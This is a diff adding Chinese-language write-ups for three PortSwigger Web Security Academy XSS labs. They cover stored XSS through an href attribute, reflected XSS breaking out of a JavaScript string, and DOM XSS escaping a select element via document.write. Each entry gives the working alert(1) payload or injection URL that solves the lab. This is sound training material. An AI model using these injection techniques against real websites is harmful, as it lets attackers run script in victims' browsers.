@@ -212,3 +212,82 @@ https://ac4e1fb81fd35987c09c1b03005500aa.web-security-academy.net/?search=123%22
 ```
 
 但我覺得沒有很清楚就是他不是打開就會跳 QQ
+
+
+## [Lab: Stored XSS into anchor href attribute with double quotes HTML-encoded](https://portswigger.net/web-security/cross-site-scripting/contexts/lab-href-attribute-double-quotes-html-encoded)
+### 題目敘述
+ This lab contains a stored cross-site scripting vulnerability in the comment functionality. To solve this lab, submit a comment that calls the alert function when the comment author name is clicked. 
+### 題目解釋
+href 可以塞 `javascript:alert(1)`
+
+### 解答
+觀察留言的地方，送網址會讓使用者出現超連結
+```
+postId=7&comment=meow&name=aaa&email=meow%40meow.meow&website=http%3A%2F%2Fmeow.com
+```
+
+而題目有說如果雙引號會被 URL Encode，而題目又說觸發只需要點下去就好，所以我們不需要跳脫 href，可以直接用
+```
+javascript:alert(1)
+```
+就過關ㄌ
+
+## [Lab: Reflected XSS into a JavaScript string with angle brackets HTML encoded](https://portswigger.net/web-security/cross-site-scripting/contexts/lab-javascript-string-angle-brackets-html-encoded)
+
+### 題目敘述
+ This lab contains a reflected cross-site scripting vulnerability in the search query tracking functionality where angle brackets are encoded. The reflection occurs inside a JavaScript string. To solve this lab, perform a cross-site scripting attack that breaks out of the JavaScript string and calls the alert function. 
+ 
+### 題目解釋
+不正常的字串串接，直接串到 js 上面，讓 js 爛掉
+
+### 解答
+
+送最簡單的 payload 觀察，發現會把 `<>` 做 Encode，但下面的程式碼明顯就是有洞
+```javascript
+var searchTerms = '&lt;script&gt;alert(1)&lt;/script&gt;';
+document.write('<img src="/resources/images/tracker.gif?searchTerms='+encodeURIComponent(searchTerms)+'">');
+```
+
+經過了一些測試發現 `searchTerms` 會直接超級暴力的解字串，無視 js
+
+假設輸入 `'` 則 他會變成 `var searchTerms = '''`
+
+所以就可以構造以下 Payload
+
+```
+'+alert(1);//
+```
+
+## [Lab: DOM XSS in document.write sink using source location.search inside a select element](https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-document-write-sink-inside-select-element)
+### 題目敘述
+ This lab contains a DOM-based cross-site scripting vulnerability in the stock checker functionality. It uses the JavaScript document.write function, which writes data out to the page. The document.write function is called with data from location.search which you can control using the website URL. The data is enclosed within a select element.
+
+To solve this lab, perform a cross-site scripting attack that breaks out of the select element and calls the alert function. 
+
+### 題目解釋
+觀察原始碼會吃的參數
+
+### 解答
+原始碼
+
+```javascript=
+var stores = ["London","Paris","Milan"];
+var store = (new URLSearchParams(window.location.search)).get('storeId');
+document.write('<select name="storeId">');
+if(store) {
+    document.write('<option selected>'+store+'</option>');
+}
+for(var i=0;i<stores.length;i++) {
+    if(stores[i] === store) {
+        continue;
+    }
+    document.write('<option>'+stores[i]+'</option>');
+}
+document.write('</select>');
+```
+
+發現他會吃 storeId 參數，然後進去裡面
+
+```
+https://ac721f361f19caf4c02c4c270073000e.web-security-academy.net/product?productId=1&storeId=123</option><script>alert(1)</script>
+```
